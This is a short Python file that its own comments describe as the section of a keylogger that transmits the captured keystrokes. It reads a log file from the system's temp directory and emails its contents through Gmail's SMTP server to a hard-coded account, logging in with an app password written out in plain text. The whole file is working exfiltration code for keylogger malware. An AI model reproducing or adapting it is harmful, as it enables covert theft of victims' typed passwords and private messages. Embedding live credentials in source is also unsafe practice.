#this section transmits the keylogged information

import smtplib
import os
import tempfile

log_path = os.path.join(tempfile.gettempdir(), "log.txt")

def readtostr():
    with open(log_path, 'r') as reader:
        logtxt=reader.read()
        return logtxt
    
#definition to send th email
def sendmail():

    #sender and receiver (same thing but can change)
    email = "dataholderacc@gmail.com"
    receiver_email="dataholderacc@gmail.com"

    #subject line
    subject="test"

    #calls the readtostr function which sets up the copying from the txt file
    #its honestly easier to just send it as plaintext instead of an attachment
    message=readtostr()

    #setting up format for email
    text=f"Subject: {subject}\n\n{message}"

    #server smtp via gmail (hate the two factor authentication req btw)
    server= smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    #extremely vulnerable info but its for a side gmail account so
    server.login(email, "ijqf bhcf yhpc ukdp")


    #sends the mail
    server.sendmail(email, receiver_email, text)

    #temp message for debugging remove later
    print("mail has been sent")